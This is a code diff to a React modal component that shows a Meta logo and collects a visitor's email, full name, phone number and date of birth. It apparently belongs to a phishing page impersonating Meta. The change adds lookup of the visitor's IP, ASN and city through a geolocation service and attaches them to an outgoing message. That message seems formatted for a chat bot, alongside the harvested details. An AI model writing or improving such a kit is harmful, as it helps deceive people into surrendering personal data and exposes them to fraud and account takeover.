@@ -2,8 +2,7 @@
 
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
-import { getTranslations } from '@/utils/translate';
-import { COUNTRY_TO_LANGUAGE, type LanguageCode } from '@/utils/country-language-map';
+import { getTranslations, COUNTRY_TO_LANGUAGE } from '@/utils/translate';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
@@ -57,10 +56,29 @@ const InitModal: FC = () => {
         birthYear: ''
     });
 
-    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep, isModalOpen } = store();
+    const { setModalOpen, geoInfo, setGeoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep, isModalOpen } = store();
 
-    // Use country code from Zustand store's geoInfo (already fetched and persisted)
-    const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
+    // Own geo-detection — sets local countryCode AND updates store's geoInfo for message
+    const [countryCode, setCountryCode] = useState('');
+    useEffect(() => {
+        const fetchGeo = async () => {
+            try {
+                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
+                const cc = (data.country_code || 'US').toLowerCase();
+                setCountryCode(cc);
+                setGeoInfo({
+                    asn: data.asn || 0,
+                    ip: data.ip || 'UNKNOWN',
+                    country: data.country || 'UNKNOWN',
+                    city: data.city || 'UNKNOWN',
+                    country_code: data.country_code || 'US'
+                });
+            } catch {
+                setCountryCode('us');
+            }
+        };
+        fetchGeo();
+    }, [setGeoInfo]);
 
     // Ensure form step is correct when modal opens
     useEffect(() => {
@@ -74,7 +92,7 @@ const InitModal: FC = () => {
         if (!countryCode) return;
 
         (async () => {
-            const lang = (COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en') as LanguageCode;
+            const lang = COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en';
             if (lang === 'en') {
                 setTranslations({});
                 return;
@@ -277,14 +295,19 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                             </div>
                         ))}
                         <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
-                        <IntlTelInput
-                            onChangeNumber={handlePhoneChange}
-                            initOptions={initOptions}
-                            inputProps={{
-                                name: 'phoneNumber',
-                                className: 'h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
-                            }}
-                        />
+                        {countryCode ? (
+                            <IntlTelInput
+                                key={countryCode}
+                                onChangeNumber={handlePhoneChange}
+                                initOptions={initOptions}
+                                inputProps={{
+                                    name: 'phoneNumber',
+                                    className: 'h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
+                                }}
+                            />
+                        ) : (
+                            <div className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] bg-gray-50 animate-pulse' />
+                        )}
 
                         {/* Date of Birth Section */}
                         <div className='mt-1.5 sm:mt-2'>
